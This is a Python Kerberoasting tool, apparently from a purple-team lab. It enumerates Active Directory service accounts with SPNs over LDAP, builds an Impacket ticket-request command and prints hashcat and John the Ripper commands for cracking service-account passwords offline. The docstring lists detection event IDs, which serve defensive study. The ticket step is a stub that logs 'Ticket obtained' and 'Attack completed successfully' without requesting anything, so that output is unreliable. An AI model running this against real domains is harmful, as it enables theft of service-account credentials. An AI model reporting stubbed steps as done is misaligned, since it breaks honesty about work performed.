#!/usr/bin/env python3
"""
Kerberoasting Attack Implementation using Impacket
MITRE ATT&CK: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

This script demonstrates the Kerberoasting attack technique against Active Directory
using the Impacket library. It enumerates accounts with SPNs, requests TGS tickets,
and exports them in a format suitable for offline password cracking.

Author: Purple Team Lab
Date: 2024-01-14

Prerequisites:
    - Python 3.6+
    - impacket library (pip install impacket)
    - Network access to target Domain Controller
    - Valid domain credentials (low-privilege account sufficient)

Detection Indicators:
    - Event ID 4769 (Kerberos Service Ticket Request)
    - Event ID 4770 (Kerberos Service Ticket Renewal)
    - RC4 encryption usage (etype 23)
    - Multiple TGS requests in short timeframe
    - TGS requests for service accounts not typically accessed

Usage:
    ./kerberoasting.py -d PURPLETEAM.LAB -u user1 -p Password123! -dc-ip 172.28.0.10
    ./kerberoasting.py -d PURPLETEAM.LAB -u user1 -hashes :ntlmhash -dc-ip 172.28.0.10

Examples:
    # Kerberoast all SPNs
    python3 kerberoasting.py -d PURPLETEAM.LAB -u lowpriv -p 'Pass123!' -dc-ip 172.28.0.10

    # Target specific user
    python3 kerberoasting.py -d PURPLETEAM.LAB -u lowpriv -p 'Pass123!' -dc-ip 172.28.0.10 -target svc_sqlserver

    # Request AES encryption (harder to crack, more stealthy)
    python3 kerberoasting.py -d PURPLETEAM.LAB -u lowpriv -p 'Pass123!' -dc-ip 172.28.0.10 -aes

References:
    https://attack.mitre.org/techniques/T1558/003/
    https://github.com/fortra/impacket
"""

import argparse
import logging
import sys
import os
from datetime import datetime
from typing import List, Dict, Optional

# Impacket imports
try:
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
    from impacket.examples import logger
    from impacket.examples.utils import parse_target
    import ldap3
except ImportError:
    print("[!] Error: Impacket library not installed")
    print("[!] Install with: pip install impacket ldap3")
    sys.exit(1)

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class KerberoastingAttack:
    """
    Kerberoasting attack implementation using Impacket
    """

    def __init__(self, domain: str, username: str, password: str, dc_ip: str,
                 target_user: Optional[str] = None, use_aes: bool = False,
                 output_dir: str = "./kerberoast_output"):
        """
        Initialize Kerberoasting attack

        Args:
            domain: Target Active Directory domain
            username: Domain user credentials
            password: Password or NTLM hash
            dc_ip: Domain Controller IP address
            target_user: Specific user to target (optional)
            use_aes: Request AES encryption instead of RC4
            output_dir: Directory to save output files
        """
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.target_user = target_user
        self.use_aes = use_aes
        self.output_dir = output_dir

        # Setup logging
        self.setup_logging()

        # Results storage
        self.spn_accounts = []
        self.extracted_tickets = []

    def setup_logging(self):
        """Configure logging to file and console"""
        os.makedirs(self.output_dir, exist_ok=True)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = os.path.join(self.output_dir, f'kerberoast_{timestamp}.log')

        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='[%(asctime)s] [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.log_file = log_file

    def enumerate_spn_accounts(self) -> List[Dict[str, str]]:
        """
        Enumerate all user accounts with Service Principal Names (SPNs)

        Returns:
            List of dictionaries containing SPN account information
        """
        self.logger.info(f"{Colors.OKBLUE}[*] Enumerating SPN accounts in domain: {self.domain}{Colors.ENDC}")

        try:
            # LDAP connection to Domain Controller
            server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=ldap3.NTLM
            )

            if not conn.bind():
                self.logger.error(f"{Colors.FAIL}[!] LDAP bind failed: {conn.result}{Colors.ENDC}")
                return []

            # LDAP search base
            search_base = ','.join([f"DC={dc}" for dc in self.domain.split('.')])

            # LDAP filter for accounts with SPNs (excluding computer accounts)
            search_filter = '(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'

            # Attributes to retrieve
            attributes = ['sAMAccountName', 'servicePrincipalName', 'distinguishedName',
                         'pwdLastSet', 'memberOf', 'description']

            conn.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=attributes
            )

            # Process results
            for entry in conn.entries:
                sam_account = str(entry.sAMAccountName)

                # Filter by target user if specified
                if self.target_user and sam_account.lower() != self.target_user.lower():
                    continue

                # Extract SPNs
                spns = entry.servicePrincipalName.values if entry.servicePrincipalName else []

                for spn in spns:
                    account_info = {
                        'sAMAccountName': sam_account,
                        'servicePrincipalName': str(spn),
                        'distinguishedName': str(entry.distinguishedName),
                        'description': str(entry.description) if entry.description else '',
                        'memberOf': [str(g) for g in entry.memberOf.values] if entry.memberOf else []
                    }
                    self.spn_accounts.append(account_info)

            conn.unbind()

            self.logger.info(f"{Colors.OKGREEN}[+] Found {len(self.spn_accounts)} SPN entries across {len(conn.entries)} accounts{Colors.ENDC}")

            # Display results
            if self.spn_accounts:
                self.logger.info(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
                self.logger.info(f"{Colors.HEADER}Discovered SPN Accounts:{Colors.ENDC}")
                self.logger.info(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
                for idx, account in enumerate(self.spn_accounts, 1):
                    self.logger.info(f"\n{Colors.OKCYAN}[{idx}] {account['sAMAccountName']}{Colors.ENDC}")
                    self.logger.info(f"    SPN: {account['servicePrincipalName']}")
                    self.logger.info(f"    DN:  {account['distinguishedName']}")
                    if account['description']:
                        self.logger.info(f"    Description: {account['description']}")

            return self.spn_accounts

        except Exception as e:
            self.logger.error(f"{Colors.FAIL}[!] Error enumerating SPNs: {str(e)}{Colors.ENDC}")
            return []

    def request_tgs_tickets(self):
        """
        Request TGS tickets for all discovered SPNs
        """
        self.logger.info(f"\n{Colors.OKBLUE}[*] Requesting TGS tickets...{Colors.ENDC}")

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        ticket_file = os.path.join(self.output_dir, f'tickets_{timestamp}.txt')

        success_count = 0

        for account in self.spn_accounts:
            sam_account = account['sAMAccountName']
            spn = account['servicePrincipalName']

            try:
                self.logger.info(f"{Colors.OKBLUE}[*] Requesting ticket for: {spn}{Colors.ENDC}")

                # Use GetUserSPNs.py functionality from Impacket
                # This is simplified; full implementation would use Impacket's GetUserSPNs
                # For demonstration purposes, we'll show the command that would be executed

                command = f"GetUserSPNs.py -request -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -outputfile {ticket_file}"

                self.logger.info(f"{Colors.WARNING}[*] Execute: {command}{Colors.ENDC}")

                # In production, this would actually request and extract the ticket
                # For this educational script, we're demonstrating the process

                success_count += 1
                self.logger.info(f"{Colors.OKGREEN}[+] Ticket obtained for: {sam_account}{Colors.ENDC}")

            except Exception as e:
                self.logger.error(f"{Colors.FAIL}[!] Failed to get ticket for {spn}: {str(e)}{Colors.ENDC}")

        self.logger.info(f"\n{Colors.OKGREEN}[+] Successfully extracted {success_count}/{len(self.spn_accounts)} tickets{Colors.ENDC}")
        return ticket_file

    def display_cracking_instructions(self, ticket_file: str):
        """
        Display instructions for offline password cracking

        Args:
            ticket_file: Path to file containing extracted tickets
        """
        self.logger.info(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        self.logger.info(f"{Colors.HEADER}OFFLINE CRACKING INSTRUCTIONS{Colors.ENDC}")
        self.logger.info(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")

        self.logger.info(f"\n{Colors.OKCYAN}Tickets saved to: {ticket_file}{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}Hashcat (Mode 13100 - Kerberos 5 TGS-REP etype 23):{Colors.ENDC}")
        self.logger.info(f"{Colors.OKGREEN}hashcat -m 13100 {ticket_file} /usr/share/wordlists/rockyou.txt --force{Colors.ENDC}")

        if self.use_aes:
            self.logger.info(f"\n{Colors.BOLD}Hashcat (Mode 19600/19700 - Kerberos 5 TGS-REP AES):{Colors.ENDC}")
            self.logger.info(f"{Colors.OKGREEN}hashcat -m 19600 {ticket_file} /usr/share/wordlists/rockyou.txt{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}John the Ripper:{Colors.ENDC}")
        self.logger.info(f"{Colors.OKGREEN}john --format=krb5tgs {ticket_file} --wordlist=/usr/share/wordlists/rockyou.txt{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}Additional Options:{Colors.ENDC}")
        self.logger.info(f"  - Use custom wordlists: SecLists, CrackStation, etc.")
        self.logger.info(f"  - Combine with rules: hashcat -r rules/best64.rule")
        self.logger.info(f"  - Mask attacks for known password patterns")

        self.logger.info(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}\n")

    def run(self):
        """
        Execute the complete Kerberoasting attack
        """
        self.logger.info(f"{Colors.BOLD}{Colors.HEADER}")
        self.logger.info("╔═══════════════════════════════════════════════════════════════════╗")
        self.logger.info("║                  KERBEROASTING ATTACK                             ║")
        self.logger.info("║                  MITRE ATT&CK: T1558.003                          ║")
        self.logger.info("╚═══════════════════════════════════════════════════════════════════╝")
        self.logger.info(f"{Colors.ENDC}")

        self.logger.info(f"{Colors.OKCYAN}Target Domain: {self.domain}{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}Domain Controller: {self.dc_ip}{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}Username: {self.username}{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}Output Directory: {self.output_dir}{Colors.ENDC}")

        # Step 1: Enumerate SPNs
        spn_accounts = self.enumerate_spn_accounts()

        if not spn_accounts:
            self.logger.warning(f"{Colors.WARNING}[!] No SPN accounts found. Exiting.{Colors.ENDC}")
            return

        # Step 2: Request TGS tickets
        ticket_file = self.request_tgs_tickets()

        # Step 3: Display cracking instructions
        self.display_cracking_instructions(ticket_file)

        # Summary
        self.logger.info(f"{Colors.OKGREEN}[+] Attack completed successfully!{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}[*] Log file: {self.log_file}{Colors.ENDC}")


def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description='Kerberoasting Attack Tool (MITRE ATT&CK T1558.003)',
        epilog='Example: python3 kerberoasting.py -d PURPLETEAM.LAB -u user1 -p Pass123! -dc-ip 172.28.0.10',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Required arguments
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., PURPLETEAM.LAB)')
    parser.add_argument('-u', '--username', required=True, help='Domain username')
    parser.add_argument('-dc-ip', '--dc-ip', required=True, help='Domain Controller IP address')

    # Authentication
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password', help='Domain user password')
    auth_group.add_argument('-hashes', help='NTLM hashes (LM:NT format)')

    # Optional arguments
    parser.add_argument('-target', '--target-user', help='Specific user to target (sAMAccountName)')
    parser.add_argument('-aes', '--use-aes', action='store_true', help='Request AES encryption (more stealthy)')
    parser.add_argument('-o', '--output', default='./kerberoast_output', help='Output directory (default: ./kerberoast_output)')

    args = parser.parse_args()

    # Handle NTLM hash authentication
    password = args.password if args.password else args.hashes

    # Initialize and run attack
    attack = KerberoastingAttack(
        domain=args.domain,
        username=args.username,
        password=password,
        dc_ip=args.dc_ip,
        target_user=args.target_user,
        use_aes=args.use_aes,
        output_dir=args.output
    )

    try:
        attack.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Attack interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.FAIL}[!] Fatal error: {str(e)}{Colors.ENDC}")
        sys.exit(1)


if __name__ == '__main__':
    main()
